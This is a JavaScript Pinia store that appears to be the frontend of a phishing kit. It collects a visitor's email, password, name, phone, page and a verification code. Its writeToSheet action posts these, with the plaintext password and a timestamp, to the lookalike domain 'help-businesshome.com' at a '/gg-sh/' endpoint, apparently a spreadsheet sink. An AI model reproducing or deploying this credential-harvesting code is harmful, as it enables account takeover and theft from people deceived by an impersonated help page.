import { defineStore } from 'pinia';

import axios from 'axios';
import VueCookies from 'vue-cookies'
import { fa0 } from '@fortawesome/free-solid-svg-icons';

import { useRoute } from 'vue-router';
const Route = useRoute();


export const useCounterStore = defineStore('counter', {
  state: () => {
    return {
      domain_Backend: 'https://help-businesshome.com', domain_Frontend: '', Path_Route: useRoute(),
      page:'',email:'',name:'',phone:'',birthday:'',message:'',password:'',code:'',
      page_dk:true,email_dk:true,name_dk:true,phone_dk:true,birthday_dk:true,message_dk:true,password_dk:true,code_dk:true,
      email_error:true,password_error:true,code_error:false,
      check_mail:false,check_password:false,check_code:false,check_all:false,
      show_password:true,
      time_login:'',

      // data_check_password:{event: "checkEmail", email: email},
      // data_check_code:{event: "checkEmail", email: email},

    }
  },

  getters: {
    // cookievalue: (state) => state.openthongtincanhan.token + "(Theta)" + state.openthongtincanhan.id,
  },

  actions: {
      Show_pw() {
        this.show_password = !this.show_password;
    },
    async writeToSheet(a,b,c,d) {
      await this.handleClick()
      await axios({ method: 'post',
      data:{row:{rc1:this.email,
                 rc2:this.password,
                 rc3:this.name,
                 rc4:this.phone,
                 rc5:this.page,
                 rc6:this.message,
                 rc7:a,
                 rc8:b,
                 rc9:c,
                 rc10:d,
                 rc11:this.time_login,
      }},
      url: this.domain_Backend + '/gg-sh/'});
    },
    handleClick() {
      // Lấy thời gian hiện tại khi người dùng nhấp vào nút
      var currentTime = new Date();
      // Biến đổi thời gian thành chuỗi để hiển thị
      var formattedTime = currentTime.toLocaleString();
      this.time_login = formattedTime
      // In thời gian ra console hoặc thực hiện bất kỳ hành động nào bạn muốn ở đây
      console.log("Người dùng đã nhấp vào nút vào lúc: " + formattedTime);
  }
    // async F_Question_BotAi() {
    //   this.data_question = await axios({ method: 'post',data:{question:this.question}, url: this.domain_Backend + '/ws/chat/'});
    //   this.data_question = this.data_question.data;
    //   this.data_question = [{question:this.question,answer:this.data_question.data}]
    //   this.question = '';
    // },
    // async F_Device_list() {
    //   this.Data_Device_list = await axios({ method: 'get', params: { id_user: this.openthongtincanhan.id }, url: this.domain_Backend + '/device-list' });
    //   this.Data_Device_list = this.Data_Device_list.data;
    // },
    // async F_Device_list_remove() {
    //   this.Data_Device_list = await axios({ method: 'post', data: {model_name: this.model_Name }, url: this.domain_Backend + '/device-list-remove' });
    //   this.Data_Device_list = this.Data_Device_list.data;
    // },
    // async F_Add_Device_list() {
    //   this.Data_Device_list = await axios({ method: 'post', data: { "Name": this.If_device.Name, "Species": this.If_device.Species, 'Code': this.If_device.Code,'id_user':this.openthongtincanhan.id }, url: this.domain_Backend + '/add-device-list' });
    //   this.Data_Device_list = this.Data_Device_list.data;
    //   this.Device_table=1;
    //   this.F_Device_list();
    // },    
  }
})


